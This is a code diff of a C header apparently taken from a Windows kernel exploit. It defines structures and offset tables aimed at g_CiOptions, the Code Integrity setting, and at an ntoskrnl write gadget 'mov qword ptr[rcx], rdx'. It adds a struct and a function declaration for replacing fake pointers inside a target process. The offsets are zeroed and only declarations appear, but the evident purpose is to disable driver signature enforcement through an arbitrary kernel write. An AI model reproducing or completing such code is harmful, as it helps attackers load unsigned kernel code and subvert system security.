@@ -6,7 +6,7 @@
 #include <TlHelp32.h>
 #include <stdio.h>
 
-#pragma comment (lib, "ntdll.lib")
+#pragma comment (lib, "psapi.lib")
 
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
 
@@ -48,6 +48,13 @@ typedef struct _IPC_SET_FUNCTION_RETURN_PARAM {
     UINT64 parameter;   // position: rcx --> &g_cioptions
 } IPC_SET_FUNCTION_RETURN_PARAM, * PIPC_SET_FUNCTION_RETURN_PARAM;
 
+typedef struct _REPLACEABLE_POINTER {
+    LPWSTR Module;
+    LPSTR Name;
+    PVOID FakePtr;
+    PVOID RealPtr;
+} REPLACEABLE_POINTER, *PREPLACEABLE_POINTER;
+
 typedef enum _WINDOWS_VERSION
 {
     WINDOWS_UNSUPPORTED,
@@ -66,7 +73,7 @@ typedef enum _WINDOWS_VERSION
 
 } WINDOWS_VERSION;
 
-const ULONG CI_G_CI_OPTIONS_OFFSET[] =
+static const ULONG CI_G_CI_OPTIONS_OFFSET[] =
 {
     0x00,
     0x00,
@@ -84,7 +91,7 @@ const ULONG CI_G_CI_OPTIONS_OFFSET[] =
 };
 
 /* mov qword ptr[rcx], rdx */
-const ULONG NTOSKRNL_GADGET_OFFSET[] =
+static const ULONG NTOSKRNL_GADGET_OFFSET[] =
 {
     0x00,
     0x00,
@@ -109,3 +116,5 @@ typedef BOOL        (WINAPI* PDEVICEIOCONTROL)(_In_ HANDLE hDevice, _In_ DWORD d
 typedef HLOCAL      (WINAPI* PLOCALALLOC) (__in UINT uFlags, __in SIZE_T uBytes);
 typedef HLOCAL      (WINAPI* PLOCALFREE) (__deref HLOCAL hMem);
 typedef int         (NTAPI* PWCSCMP)(const wchar_t* string1, const wchar_t* string2);
+
+LPVOID ReplaceFakePointers(HANDLE hProcess, LPVOID buffer, DWORD DataSize, PREPLACEABLE_POINTER pReplPointers, DWORD count);
